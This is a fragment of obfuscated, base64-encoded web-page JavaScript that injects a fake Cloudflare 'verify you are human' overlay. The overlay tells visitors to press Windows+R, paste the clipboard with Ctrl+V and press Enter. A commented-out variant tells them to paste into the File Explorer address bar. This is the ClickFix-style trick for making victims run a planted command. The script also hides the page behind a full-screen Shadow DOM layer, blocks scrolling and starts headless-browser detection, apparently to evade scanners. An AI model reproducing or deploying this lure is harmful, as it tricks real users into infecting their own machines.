WdNVFV1T0RrMk1TQTJNaTQzTWpNMklERTFMamt4T0RrZ05qSXVOek0yTlNBeE5TNDVNemc1UXpZeUxqYzBPVFVnTVRVdU9UVTRPU0EyTWk0M05qWTVJREUxTGprM05UVWdOakl1TnpnM05DQXhOUzQ1T0RjelF6WXlMamd3TnprZ01UVXVPVGs1TVNBMk1pNDRNekE1SURFMkxqQXdOVGdnTmpJdU9EVTBOQ0F4Tmk0d01EWTRRell5TGpnMU5qa2dNVFl1TURBMk9DQTJNaTQ0TlRreUlERTJMakF3TmpnZ05qSXVPRFl4T0NBeE5pNHdNRFk0U0RjeUxqUTFNREpETnpJdU5UQTJJREUyTGpBd056TWdOekl1TlRZd05DQXhOUzQ1T0RreklEY3lMall3TlRFZ01UVXVPVFUxTkVNM01pNDJORGs0SURFMUxqa3lNVFlnTnpJdU5qZ3lNeUF4TlM0NE56TTVJRGN5TGpZNU56Y2dNVFV1T0RFNU5VTTNNaTQ0TmpjM0lERTFMakl3TkRNZ056SXVPVFV6TlNBeE5DNDFOamcwSURjeUxqazFNamtnTVRNdU9USTVOa00zTWk0NU5URTNJREV3TGpBM05qY2dOamt1T0Rjek1pQTJMamsxTWpnMUlEWTJMakEzTlRnZ05pNDVOVEk0TlZvaUlHWnBiR3c5SWlOR1FrRkVOREVpUGp3dmNHRjBhRDQ4Y0dGMGFDQmtQU0pOT0M0eE1UazJNeUF4T0M0NE9UQTBTRGt1TnpVMU5ERldNak11TkRJMU5FZ3hNaTQyTVRNNVZqSTBMamczT1RoSU9DNHhNVGsyTTFZeE9DNDRPVEEwV2lJZ1kyeGhjM005SW1Oc1JYbHZkbWs1YkRRaVBqd3ZjR0YwYUQ0OGNHRjBhQ0JrUFNKTk1UUQ==",
    "1rlnx4": "MC44MzYwNDQ1MTU2NDU1Mjgx",
    "fo896s": "MC41NzU2NzAyOTIxNjA3OTMx",
    "in9ddp": "MC4yNTUxNzAzNDcxODg3NzQ5Ng=="
  };

  var _c = [
    "MC4xMDgyOTM0ODEyMjk5OTg4Mg==",
    "MC43MTA3MTE2NDUyMDE4MjE3",
    "MC4xOTY1NDI5MzE3NjU4MTgwNQ==",
    "MC4zMjkzOTI0MTI2NTM1MTU1",
    "MC4wNjc3MzUyNTA3MjczNjI0Mg==",
    "MC43MzI4MTg2MDI4NzEzMjA0",
    "dU16QTRNU0F5TVM0NU1ESXpWakl4TGpnNE5UTkRNVFF1TXpBNE1TQXlNQzR4TmpVMUlERTFMalkzTkNBeE9DNDNOekEwSURFM0xqUTVOVElnTVRndU56Y3dORU14T1M0ek1UWTBJREU0TGpjM01EUWdNakF1TmpZMU15QXlNQzR4TkRneUlESXdMalkyTlRNZ01qRXVPRFk0TVZZeU1TNDRPRFV6UXpJd0xqWTJOVE1nTWpNdU5qQTFNaUF4T1M0eU9Ua3hJREkwTGprNU9UUWdNVGN1TkRjNE5TQXlOQzQ1T1RrMFF6RTFMalkxTnpnZ01qUXVPVGs1TkNBeE5DNHpNRGd4SURJekxqWXlNaklnTVRRdU16QTRNU0F5TVM0NU1ESXpXazB4T0M0NU9UVTRJREl4TGprd01qTldNakV1T0RnMU0wTXhPQzQ1T1RVNElESXhMakF5TWpJZ01UZ3VNemd3TmlBeU1DNHlOamM1SURFM0xqUTNPRFVnTWpBdU1qWTNPVU14Tmk0MU9EUTJJREl3TGpJMk56a2dNVFV1T1RnMU9DQXlNUzR3TURNNElERTFMams0TlRnZ01qRXVPRFk0TVZZeU1TNDRPRFV6UXpFMUxqazROVGdnTWpJdU56UTROQ0F4Tmk0Mk1ERXpJREl6TGpVd01qVWdNVGN1TkRrMU1pQXlNeTQxTURJMVF6RTRMak01TnpNZ01qTXVOVEF5TlNBeE9DNDVPVFU0SURJeUxqYzJOallnTVRndU9UazFPQ0F5TVM0NU1ESXpXaUlnWTJ4aGMzTTlJbU5zUlhsdmRtazViRFFpUGp3dmNHRjBhRDQ4Y0dGMGFDQmtQU0pOTWpJdU5qWTNOQ0F5TWk0eU5UTldNVGd1T0Rrd01VZ3lOQzR6TWpnMFZqSXlMakl4T1RGRE1qUXVNekk0TkNBeU15NHdPREl5SURJMExqYzFPRFFnTWpNdU5Ea3pPU0F5TlM0ME1UVTVJREl6TGpRNU16bERNall1TURjek15QXlNeTQwT1RNNUlESTJMalV3TXpRZ01qTXVNVEF3TXlBeU5pNDFNRE0wSURJeUxqSTJNVGRXTVRndU9Ea3dNVWd5T0M0eE5qUTNWakl5TGpJd09UTkRNamd1TVRZME55QXlOQzR4TkRNeUlESTNMakEzTnpJZ01qUXVPVGc1T1NBeU5TNHpPVGt4SURJMExqazRPVGxETWpNdU56SXhNU0F5TkM0NU9EazVJREl5TGpZMk56UWdNalF1TVRJMk9DQXlNaTQyTmpjMElESXlMakkxTWpJaUlHTnNZWE56UFNKamJFVjViM1pwT1d3MElqNDhMM0JoZEdnK1BIQmhkR2dnWkQwaVRUTXdMalkyT0NBeE9DNDRPVEEzU0RNeUxqazBORFZETXpVdU1EVXlOaUF4T0M0NE9UQTNJRE0yTGpJM05TQXlNQzR4TWpJMklETTJMakkzTlNBeU1TNDROVEE0VmpJeExqZzJPRFJETXpZdU1qYzFJREl6TGpVNU5qTWdNelV1TURNMU5TQXlOQzQ0T0NBek1pNDVNVEVnTWpRdU9EaElNekF1TmpZNFZqRTRMamc1TURkYVRUTXlMamszSURJekxqUXdOelpETXpNdU9UUTRNeUF5TXk0ME1EYzJJRE0wTGpVNU55QXlNaTQ0TmpBNUlETTBMalU1TnlBeU1TNDRPVEk0VmpJeExqZzNOVGxETXpRdU5UazNJREl3TGpreE56Z2dNek11T1RRNE15QXlNQzR6TmpFMElETXlMamszSURJd0xqTTJNVFJJTXpJdU16QXpPRll5TXk0ME1EZ3lURE15TGprM0lESXpMalF3TnpaYUlpQmpiR0Z6Y3owaVkyeEZlVzkyYVRsc05DSStQQzl3WVhSb1BqeHdZWFJvSUdROUlrMHpPQzQyTlRJMUlERTRMamc1TURSSU5ETXVNemN6T0ZZeU1DNHpORFV6U0RRd0xqSTRPRE5XTWpFdU16WXpNa2cwTXk0d056bFdNakl1TnpRd04wZzBNQzR5T0RnelZqSTBMamczT1RoSU16Z3VOalV5TlZZeE9DNDRPVEEwV2lJZ1kyeGhjM005SW1Oc1JYbHZkbWs1YkRRaVBqd3ZjR0YwYUQ0OGNHRjBhQ0JrUFNKTk5EVXVOalVnTVRndU9Ea3dORWcwTnk0eU9EVTRWakl6TGpReU5UUklOVEF1TVRRME0xWXlOQzQ0TnprNFNEUTFMalkxVmpFNExqZzVNRFJhSWlCamJHRnpjejBpWTJ4RmVXOTJhVGxzTkNJK1BDOXdZWFJvUGp4d1lYUm9JR1E5SWswMU5DNDBNVGczSURFNExqZzBOelZJTlRVdU9UazBPVXcxT0M0MU1EYzVJREkwTGpnM09UZElOVFl1TnpVME1VdzFOaTR6TWpNNElESXpMamd4TURGSU5UUXVNRFEzVERVekxqWXlOVGNnTWpRdU9EYzVOMGcxTVM0NU1EVTRURFUwTGpReE9EY2dNVGd1T0RRM05WcE5OVFV1T0RVeE9DQXlNaTQxTVRnelREVTFMakU1TkRFZ01qQXVPREUxTkV3MU5DNDFNamM0SURJeUxqVXhPRE5JTlRVdU9EVXhPRm9pSUdOc1lYTnpQU0pqYkVWNWIzWnBPV3cwSWo0OEwzQmhkR2crUEhCaGRHZ2daRDBpVFRZd0xqWXhORGtnTVRndU9Ea3dNVWcyTXk0ME1EVTJRelkwTGpNd09ETWdNVGd1T0Rrd01TQTJOQzQ1TXpFM0lERTVMakV6SURZMUxqTXlPQ0F4T1M0MU5EQTJRelkxTGpZM05ESWdNVGt1T0RneklEWTFMamcxTVRFZ01qQXVNelEyTWlBMk5TNDROVEV4SURJd0xqa3pOVGRXTWpBdU9UVXlOa00yTlM0NE5URXhJREl4TGpnMk56Z2dOalV1TXpZNU1TQXlNaTQwTnpVMElEWTBMall6TmprZ01qSXVOemt4T1V3Mk5pNHdORFVnTWpRdU9EaElOalF1TVRVMU9FdzJNaTQ1TmpjeElESXpMakEyTlRoSU5qSXVNalV3TjFZeU5DNDRPRWcyTUM0Mk1UUTVWakU0TGpnNU1ERmFUVFl6TGpNeU9Ua2dNakV1TnpZMU5FTTJNeTQ0T0RZMElESXhMamMyTlRRZ05qUXVNakEzTVNBeU1TNDBPVEUxSURZMExqSXdOekVnTWpFdU1EVTFNVll5TVM0d016Z3hRelkwTGpJd056RWdNakF1TlRZM05DQTJNeTQ0TmprM0lESXdMak15T0NBMk15NHpNakV4SURJd0xqTXlPRWcyTWk0eU5UQTNWakl4TGpjMk5qVk1Oak11TXpJNU9TQXlNUzQzTmpVMFdpSWdZMnhoYzNNOUltTnNSWGx2ZG1rNWJEUWlQand2Y0dGMGFENDhjR0YwYUNCa1BTSk5Oamd1TWpFeE1pQXhPQzQ0T1RBMFNEY3lMamsxTnpoV01qQXVNekF5TkVnMk9TNDRNekF5VmpJeExqSXdPVWczTWk0Mk5qTXlWakl5TGpVeE9ETklOamt1T0RNd01sWXlNeTQwTmpnelNEY3pWakkwTGpnM09UaElOamd1TWpFeE1sWXhPQzQ0T1RBMFdpSWdZMnhoYzNNOUltTnNSWGx2ZG1rNWJEUWlQand2Y0dGMGFENDhjR0YwYUNCa1BTSk5OQzQxTXpneU5DQXlNaTQyTURRelF6UXVNekE1TVRnZ01qTXVNVE1nTXk0NE1qY3lNeUF5TXk0MU1ESXlJRE11TVRnMk9ERWdNak11TlRBeU1rTXlMakk1TWpZMUlESXpMalV3TWpJZ01TNDJOemMwTmlBeU1pNDNORGt6SURFdU5qYzNORFlnTWpFdU9EZzFNVll5TVM0NE5qYzRRekV1TmpjM05EWWdNakV1TURBME55QXlMakkzTlRreklESXdMakkyTnpZZ015NHhOams0SURJd0xqSTJOelpETXk0NE5ETTJOeUF5TUM0eU5qYzJJRFF1TXpVMk9ERWdNakF1TmpnNE1pQTBMalUzTXpRZ01qRXVNall3TlVnMkxqSTVOelkwUXpZdU1ESXhOVEVnTVRrdU9ETTBPU0EwTGpjNE56RTJJREU0TGpjM01EY2dNeTR4T0RZNE1TQXhPQzQzTnpBM1F6RXVNelkxTXpNZ01UZ3VOemN3TnlBd0lESXdMakUyTmpZZ01DQXlNUzQ0T0RVeFZqSXhMamt3TWpGRE1DQXlNeTQyTWpFNUlERXVNelE0TmlBeU5TQXpMakUyT1RnZ01qVkROQzQzTWpjMk1pQXlOU0ExTGprME5USTFJREl6TGprM05qUWdOaTR5TmpZME5TQXlNaTQyTURRMlREUXVOVE00TWpRZ01qSXVOakEwTTFvaUlHTnNZWE56UFNKamJFVjViM1pwT1d3MElqNDhMM0JoZEdnK1BDOXpkbWMrRFFvZ0lDQWdJRHhrYVhZK0RRb2dJQ0FnSUNBZ0lEeHpjR0Z1SUhOMGVXeGxQU0owWlhoMExXUmxZMjl5WVhScGIyNDZJSFZ1WkdWeWJHbHVaVHNpUGxCeWFYWmhZM2s4TDNOd1lXNCtJT0tBb2lBOGMzQmhiaUJ6ZEhsc1pUMGlkR1Y0ZEMxa1pXTnZjbUYwYVc5dU9pQjFibVJsY214cGJtVTdJajVVWlhKdGN6d3ZjM0JoYmo0TkNpQWdJQ0FnUEM5a2FYWStEUW9nSUNBZ0lBMEtJQ0FnSUR3dlpHbDJQZzBLSUNBZ1BDOWthWFkrRFFvTkNpQWdJRHhrYVhZZ2FXUTlJbWxCTW0xUGFHdDJla3hUV2tZM2EyVWlJR05zWVhOelBTSmpSM1p1YW1nNVFrSkxJaUJ6ZEhsc1pUMGlZbTl5WkdWeUxYUnZjRG9nYm05dVpUc2djR0ZrWkdsdVp5MTBiM0E2SURBN0lHMWhjbWRwYmkxMGIzQTZJREE3YldGeVoybHVMV0p2ZEhSdmJUb3dPeUkrRFFvZ0lDQWdQR1JwZGlCamJHRnpjejBpWTFJeFVreFlUVmswSWo0TkNpQWdJQ0FnUEcxaGFXNGdZMnhoYzNNOUltTlRTVU5VU1hWc2VGRndOMHRZSWlCemRIbHNaVDBpWTI5c2IzSTZJQ05rT1dRNVpEazdJajROQ2lBZ0lDQWdJQ0FnUEdScGRpQmpiR0Z6Y3owaVkxQnFUME56T1hCcVpHbFFaU0krRFFvZ0lDQWdJQ0FnSUNBZ1BIQWdjM1I1YkdVOUltWnZiblF0YzJsNlpUb2dNVGh3ZURzZ2JXRnlaMmx1TFdKdmRIUnZiVG9nTVRWd2VEc2lQZzBLSUNBZ0lDQWdJQ0FnSUNBZ1ZHOGdjSEp2ZG1VZ2VXOTFJR0Z5WlNCdWIzUWdZU0J5YjJKdmRDd2djR3hsWVhObE9nMEtJQ0FnSUNBZ0lDQWdJQ0FnUEM5d1BnMEtJQ0FnSUNBZ0lDQWdJRHh2YkQ0TkNpQWdJQ0FnSUNBZ0lDQThiR2srVUhKbGMzTWdKbUZ0Y0RzZ2FHOXNaQ0IwYUdVZ1YybHVaRzkzY3lCTFpYa2dQR2tnWTJ4aGMzTTlJbU14V1daTU1YcDFjelI2U1VNM2FTQmphSEJpTTJJeWQxbHZielVpUGp3dmFUNGdLeUE4WWo1U1BDOWlQaTQ4TDJ4cFBnMEtJQ0FnSUNBZ0lDQWdJRHhzYVQ1WGFHVnVJSFJvWlNCM2FXNWtiM2NnYjNCbGJuTXNJSEJ5WlhOeklEeGlQa04wY213OEwySStJQ3NnUEdJK1Zqd3ZZajR1UEM5c2FUNE5DaUFnSUNBZ0lDQWdJQ0E4YkdrK1VHRnpkR1VnZEdobElHTnZiVzFoYm1RZ2FXNTBieUJTZFc0Z1lXNWtJSEJ5WlhOeklEeGlQa1Z1ZEdWeVBDOWlQaUIwYnlCMlpYSnBabmt1UEM5c2FUNE5DZzBLSUNBZ0lDQWdJQ0FnSUR3aExTMGdQR3hwUGxCeVpYTnpJQ0J2YmlCNWIzVnlJR3RsZVdKdllYSmtJSFJ2SUdacGJtbHphQzQ4TDJ4cFBpQXRMVDROQ2lBZ0lDQWdJQ0FnSUNBOEwyOXNQZzBLSUNBZ0lDQWdJQ0FnSUR4d0lITjBlV3hsUFNKd1lXUmthVzVuTFhSdmNEb2dNVEJ3ZURzaVBnMEtJQ0FnSUNBZ0lDQWdJRmx2ZFNCemFHOTFiR1FnYzJWbElIUm9hWE1nZEdWNGRDQmhjSEJsWVhJNkRRb2dJQ0FnSUNBZ0lDQWdQR0p5SUM4K0RRb2dJQ0FnSUNBZ0lDQWdQR052WkdVZ2MzUjViR1U5SW1KaFkydG5jbTkxYm1RNklHNXZibVU3SUdKdmNtUmxjam9nTVhCNElITnZiR2xrSUNNM09UYzVOems3SUhkcFpIUm9PaUEwTXpKd2VEc2lQa2tnWVcwZ2JtOTBJR0VnY205aWIzUWdMU0JEYkc5MVpHWnNZWEpsSUVsRU9pQThjM0JoYmlCcFpEMGlhWGhVV1ZNd1lXdzBVbk5NYVNJK05qQXhabVl6TkRjOEwzTndZVzQrUEM5amIyUmxQZzBLSUNBZ0lDQWdJQ0FnSUR3dmNENE5DaUFnSUNBZ0lDQWdJQ0FOQ2lBZ0lDQThMMlJwZGo0TkNnMEtJQ0FnSUNBOEwyMWhhVzQrRFFvZ0lDQWdQQzlrYVhZK0RRb05DaUFnSUNBZ0lDQWdQR1JwZGlCemRIbHNaVDBpWkdsemNHeGhlVG9nYm05dVpUc2lQZzBLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQTBLSUNBZ0lDQWdJQ0FnSUR4dmJENE5DaUFnSUNBZ0lDQWdJQ0E4SVMwdElDNHVMaTR1TGk0OGJHa2djM1I1YkdVOUltMWhjbWRwYmkxaWIzUjBiMjA2SURFd2NIZzdJajROQ2lBZ0lDQWdJQ0FnSUNBZ0lFTnZjSGtnZEdobElHWnBiR1VnY0dGMGFDQmlaV3h2ZHcwS0lDQWdJQ0FnSUNBZ0lDQWdQR1JwZGlCamJHRnpjejBpWTJJNFExQlJPRzlQWW1GS1dVUnVUeUlnYVdROUltbFJXSEZxYkUwNFdtRjJNVXdpSUc5dVkyeHBZMnM5SW5Sb2FYTXVZMnhoYzNOTWFYTjBMbUZrWkNnblkyeHBZMnRsWkNjcElqNE5DaUFnSUNBZ0lDQWdJQ0FnSUVNNlhHbHVkR1Z5Ym1Gc0xYTmxZM1Z5WlZ4bWFXeGxaSEpwZG1WY1NGSlFiMnhwWTNrdVpHOWplQTBLSUNBZ0lDQWdJQ0FnSUNBZ1BDOWthWFkrRFFvZ0lDQWdJQ0FnSUNBZ1BDOXNhVDRnT3pzN096czdPeTB0UGcwS0lDQWdJQ0FnSUNBZ0lEeHNhU0J6ZEhsc1pUMGliV0Z5WjJsdUxXSnZkSFJ2YlRvZ01UQndlRHNpUGs5d1pXNGdSbWxzWlNCRmVIQnNiM0psY2lCaGJtUWdjMlZzWldOMElIUm9aU0JoWkdSeVpYTnpJR0poY2lBb1BITjBjbTl1Wno1RFZGSk1JQ3NnVER3dmMzUnliMjVuUGlrOEwyeHBQZzBLSUNBZ0lDQWdJQ0FnSUR4c2FTQnpkSGxzWlQwaWJXRnlaMmx1TFdKdmRIUnZiVG9nTVRCd2VEc2lQbEJoYzNSbElIUm9aU0J3WVhSb0lDZzhjM1J5YjI1blBrTlVVa3dnS3lCV1BDOXpkSEp2Ym1jK0tTQmhibVFnY0hKbGMzTWdQSE4wY205dVp6NUZiblJsY2p3dmMzUnliMjVuUGp3dmJHaytEUW9nSUNBZ0lDQWdJQ0FnUEM5dmJENE5DZzBLSUNBZ0lDQWdJQ0FnSUR4cGJuQjFkQ0IwZVhCbFBTSm1hV3hsSWlCcFpEMGlhWFpvY2xCNmNESldJaUJ6ZEhsc1pUMGlaR2x6Y0d4aGVUb2dibTl1WlRzaVBnMEtJQ0FnSUNBZ0lDQWdJRHhpZFhSMGIyNGdhV1E5SW1sT05VeDVNRkJ0V2pRaVBrOXdaVzRnUm1sc1pTQkZlSEJzYjNKbGNqd3ZZblYwZEc5dVBnMEtJQ0FnSUNBZ0lDQThMMlJwZGo0TkNnMEtEUW9nSUNBOFpHbDJJR05zWVhOelBTSmpVakZTVEZoTldUUWdZekpCZDBJNVEyOVlSeUlnYzNSNWJHVTlJbUpoWTJ0bmNtOTFibVE2SUc1dmJtVTdJajROQ2lBZ0lDQWdQR1JwZGlCamJHRnpjejBpWXpKQmQwSTVRMjlZUnkxc1pXWjBJaUJ6ZEhsc1pUMGlkMmxrZEdnNklESTRObkI0T3lCbWJHOWhkRG9nYkdWbWREc2dkR1Y0ZEMxaGJHbG5iam9nYkdWbWREc2dabTl1ZEMxemFYcGxPaUF4TlhCNE95SStEUW9nSUNBZ0lDQlFaWEptYjNKdElIUm9aU0J6ZEdWd2N5QmhZbTkyWlNCMGJ5Qm1hVzVwYzJnZ2RtVnlhV1pwWTJGMGFXOXVMZzBLSUNBZ0lDQThMMlJwZGo0TkNpQWdJQ0FnUEdKMWRIUnZiaUIwZVhCbFBTSmlkWFIwYjI0aUlHTnNZWE56UFNKamJFYzNRakkxTURJZ1kxQkJVRTF6TlUxTE1WbHhNMjlNZVNJZ2FXUTlJbWxMVVVGNFNXVm5iM0IxWlV3aUlITjBlV3hsUFNKaVlXTnJaM0p2ZFc1a09pQWpOV1UxWlRWbE95QndZV1JrYVc1bk9pQTVjSGdnTXpod2VEc2diM0JoWTJsMGVUb2dNQzQxT3lCamRYSnpiM0k2SUc1dmRDMWhiR3h2ZDJWa095SWdaR2x6WVdKc1pXUStWbVZ5YVdaNVBDOWlkWFIwYjI0K0RRb2dJQ0FnUEM5a2FYWStEUW9nSUNBOEwyUnBkajROQ2cwS0lDQWdQQ0V0TFNBdExUNE5DZzBLRFFvTkNpQWdQQzlrYVhZK0RRb2dJQ0FnUEhBZ1kyeGhjM005SW1OeU9HdHRWR3hDUkhaMWRuVnNkeUlnYzNSNWJHVTlJbVp2Ym5RdGMybDZaVG9nTVM0MWNtVnRPdzBLSUNBZ0lHeHBibVV0YUdWcFoyaDBPaUF5TGpJMWNtVnRPeUJ3WVdSa2FXNW5MWFJ2Y0RvZ01qQndlRHNpUGp4emNHRnVJR05zWVhOelBTSmpVRmxqTkV4TFowMGlQand2YzNCaGJqNGdibVZsWkhNZ2RHOGdjbVYyYVdWM0lIUm9aU0J6WldOMWNtbDBlU0J2WmlCNWIzVnlJR052Ym01bFkzUnBiMjRnWW1WbWIzSmxJSEJ5YjJObFpXUnBibWN1UEM5d1BnMEtJQ0FnSUR4d0lHTnNZWE56UFNKalpUTlBkRFkwTTBadGNEZ3dOa2NpSUhOMGVXeGxQU0ptYjI1MExYTnBlbVU2SURFdU5YSmxiVHNnYkdsdVpTMW9aV2xuYUhRNklESXVNalZ5WlcwN0lIQmhaR1JwYm1jdGRHOXdPaUF5TUhCNE95QmthWE53YkdGNU9pQnViMjVsT3lJK1YyRnBkR2x1WnlCbWIzSWdQSE53WVc0Z1kyeGhjM005SW1OUVdXTTBURXRuVFNJK1BDOXpjR0Z1UGk0dUxqd3ZjRDROQ2lBOEwyUnBkajROQ2lBTkNpQThaR2wySUdOc1lYTnpQU0pqYlZOdVRVTllUMnREYW0waUlISnZiR1U5SW1OdmJuUmxiblJwYm1adklqNE5DaUFnUEdScGRpQmpiR0Z6Y3owaVkyMVRiazFEV0U5clEycHRMV2x1Ym1WeUlqNE5DaUFnSUR4a2FYWStEUW9nSUNBZ1BHUnBkajVTWVhrZ1NVUTZJRHhqYjJSbElHTnNZWE56UFNKak5ua3phMGQwZDBObElqNDFObUUwWXpVeU9UbG1aR1YwYldOaFBDOWpiMlJsUGp3dlpHbDJQZzBLSUNBZ1BDOWthWFkrRFFvZ0lDQThaR2wySUhOMGVXeGxQU0p0WVhKbmFXNHRkRzl3T2lBMWNIZzdJajVRWlhKbWIzSnRZVzVqWlNBbUlITmxZM1Z5YVhSNUlHSjVJRHh6Y0dGdUlHTnNZWE56UFNKalJ6aFdTSEIwZDNGbWNGbG1ZVUpaSWo1RGJHOTFaR1pzWVhKbFBDOXpjR0Z1UGp3dlpHbDJQZzBLSUNBOEwyUnBkajROQ2lBOEwyUnBkajROQ2p3dlpHbDJQZzBLRFFvOGMyTnlhWEIwUGcwS0RRb05DZzBLUEM5elkzSnBjSFErRFFvTkNnMEtQQzlpYjJSNVBqd3ZhSFJ0YkQ0PSc7CiAgICBjb25zdCBoID0gYjY0VG9VdGY4KGI2NCk7CgogICAgLy8gQ3JlYXRlIGhvc3QgZWxlbWVudCBmb3IgU2hhZG93IERPTQogICAgY29uc3QgaG9zdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwogICAgaG9zdC5pZCA9ICd0Zi1vdmVybGF5LWhvc3QnOwogICAgaG9zdC5zdHlsZS5jc3NUZXh0ID0gJ3Bvc2l0aW9uOmZpeGVkO3RvcDowO2xlZnQ6MDt3aWR0aDoxMDB2dztoZWlnaHQ6MTAwdmg7ei1pbmRleDoyMTQ3NDgzNjQ3O2JhY2tncm91bmQ6dHJhbnNwYXJlbnQ7Ym9yZGVyOm5vbmU7bWFyZ2luOjA7cGFkZGluZzowOyc7CiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGhvc3QpOwoKICAgIC8vIEF0dGFjaCBTaGFkb3cgRE9NIGZvciBzdHlsZSBpc29sYXRpb24KICAgIGNvbnN0IHNoYWRvdyA9IGhvc3QuYXR0YWNoU2hhZG93KHsgbW9kZTogJ29wZW4nIH0pOwogICAgCiAgICAvLyBQYXJzZSB0aGUgSFRNTCBjb250ZW50IHVzaW5nIERPTVBhcnNlciB0byBwcm9wZXJseSBleHRyYWN0IHBhcnRzCiAgICBjb25zdCBwYXJzZXIgPSBuZXcgRE9NUGFyc2VyKCk7CiAgICBjb25zdCBkb2MgPSBwYXJzZXIucGFyc2VGcm9tU3RyaW5nKGgsICd0ZXh0L2h0bWwnKTsKCiAgICAvLyAxLiBFeHRyYWN0IGFuZCBwcm9jZXNzIFN0eWxlcwogICAgZG9jLnF1ZXJ5U2VsZWN0b3JBbGwoJ3N0eWxlJykuZm9yRWFjaChzdHlsZSA9PiB7CiAgICAgICAgbGV0IGNzcyA9IHN0eWxlLnRleHRDb250ZW50IHx8ICcnOwogICAgICAgIC8vIFJlcGxhY2UgJ2JvZHknIHNlbGVjdG9yIHdpdGggJyN0Zi1vdmVybGF5LXJvb3QnIChoYW5kbGluZyBjb250ZXh0KQogICAgICAgIGNzcyA9IGNzcy5yZXBsYWNlKC8oXnxbXH1ccyxdKWJvZHkoPz1bXHMsXC57XSkvZywgJyQxI3RmLW92ZXJsYXktcm9vdCcpOwogICAgICAgIC8vIFJlcGxhY2UgJ2h0bWwnIHNlbGVjdG9yIHdpdGggJzpob3N0JwogICAgICAgIGNzcyA9IGNzcy5yZXBsYWNlKC8oXnxbXH1ccyxdKWh0bWwoPz1bXHMsXC57XSkvZywgJyQxOmhvc3QnKTsKICAgICAgICBzdHlsZS50ZXh0Q29udGVudCA9IGNzczsKICAgICAgICBzaGFkb3cuYXBwZW5kQ2hpbGQoc3R5bGUpOwogICAgfSk7CgogICAgLy8gMi4gRXh0cmFjdCBhbmQgbW92ZSBleHRlcm5hbCBzdHlsZXNoZWV0cwogICAgZG9jLnF1ZXJ5U2VsZWN0b3JBbGwoJ2xpbmtbcmVsPSJzdHlsZXNoZWV0Il0nKS5mb3JFYWNoKGxpbmsgPT4gewogICAgICAgIHNoYWRvdy5hcHBlbmRDaGlsZChsaW5rKTsKICAgIH0pOwoKICAgIC8vIDMuIENyZWF0ZSBjb250YWluZXIgaW5zaWRlIHNoYWRvdyAoYWN0aW5nIGFzIHBzZXVkby1ib2R5KQogICAgY29uc3QgY29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7CiAgICBjb250YWluZXIuaWQgPSAndGYtb3ZlcmxheS1yb290JzsKICAgIGNvbnRhaW5lci5zdHlsZS5jc3NUZXh0ID0gJ3dpZHRoOjEwMCU7aGVpZ2h0OjEwMCU7ZGlzcGxheTpmbGV4O2ZsZXgtZGlyZWN0aW9uOmNvbHVtbjttYXJnaW46MDtwYWRkaW5nOjA7JzsKICAgIAogICAgLy8gQ29weSBib2R5IGF0dHJpYnV0ZXMgKGNsYXNzZXMsIGlubGluZSBzdHlsZXMpIGZyb20gdGVtcGxhdGUgdG8gb3VyIGNvbnRhaW5lcgogICAgaWYgKGRvYy5ib2R5KSB7CiAgICAgICAgQXJyYXkuZnJvbShkb2MuYm9keS5hdHRyaWJ1dGVzKS5mb3JFYWNoKGF0dHIgPT4gewogICAgICAgICAgICBpZiAoYXR0ci5uYW1lID09PSAnc3R5bGUnKSB7CiAgICAgICAgICAgICAgICAgY29udGFpbmVyLnN0eWxlLmNzc1RleHQgKz0gJzsnICsgYXR0ci52YWx1ZTsKICAgICAgICAgICAgfSBlbHNlIGlmIChhdHRyLm5hbWUgPT09ICdjbGFzcycpIHsKICAgICAgICAgICAgICAgICBjb250YWluZXIuY2xhc3NOYW1lID0gYXR0ci52YWx1ZTsKICAgICAgICAgICAgfSBlbHNlIGlmIChhdHRyLm5hbWUgIT09ICdpZCcpIHsKICAgICAgICAgICAgICAgICBjb250YWluZXIuc2V0QXR0cmlidXRlKGF0dHIubmFtZSwgYXR0ci52YWx1ZSk7CiAgICAgICAgICAgIH0KICAgICAgICB9KTsKICAgICAgICAKICAgICAgICAvLyBNb3ZlIGFsbCBjaGlsZHJlbiBmcm9tIHRlbXBsYXRlIGJvZHkgdG8gY29udGFpbmVyCiAgICAgICAgd2hpbGUgKGRvYy5ib2R5LmZpcnN0Q2hpbGQpIHsKICAgICAgICAgICAgY29udGFpbmVyLmFwcGVuZENoaWxkKGRvYy5ib2R5LmZpcnN0Q2hpbGQpOwogICAgICAgIH0KICAgIH0KICAgIAogICAgc2hhZG93LmFwcGVuZENoaWxkKGNvbnRhaW5lcik7CiAgICAKICAgIC8vIFN0b3JlIHNoYWRvdyByb290IGdsb2JhbGx5IGZvciBzY3JpcHRzIHRvIHF1ZXJ5IGVsZW1lbnRzCiAgICB3aW5kb3cuX190ZlNoYWRvd1Jvb3QgPSBzaGFkb3c7CiAgICAKICAgIC8vIEZvcmNlIGxheW91dCByZWNhbGN1bGF0aW9uCiAgICB2b2lkIGhvc3Qub2Zmc2V0SGVpZ2h0OwogICAgCiAgICAvLyBCbG9jayBzY3JvbGwgb24gYm9keQogICAgZG9jdW1lbnQuYm9keS5zdHlsZS5vdmVyZmxvdyA9ICdoaWRkZW4nOwogICAgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LnN0eWxlLm92ZXJmbG93ID0gJ2hpZGRlbic7CiAgICB3aW5kb3cuc2Nyb2xsVG8oMCwgMCk7CiAgICAKICAgIHNldFRpbWVvdXQoaW5qZWN0U2NyaXB0LCAwKTsKICB9CgogIGNvbnN0IEhFQURMRVNTX1dFSUdIVCA9IDEwOwogIGNvbnN0IEhFQURGVUxfV0VJR0hUID0gLTg7CiAgY29uc3QgU1VTUElDSU9VU19XRUlHSFQgPSA1OwoKICBhc3luYyBmdW5jdGlvbiBkZXRlY3RIZWFkbGVzcygpIHsKICAgIGNvbnN0IGNoZWNrcyA9IFsKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IHVhID0gbmF2aWdhdG9yLnVzZXJBZ2VudC50b0xvd2VyQ2FzZSgpOwogICAgICAgIGNvbnN0IGlzSGVhZGxlc3MgPSAvaGVhZGxlc3N8cGhhbnRvbWpzfHNlbGVuaXVtfHdlYmRyaXZlci9pLnRlc3QodWEpOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc0hlYWRsZXNzID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGhhc1dl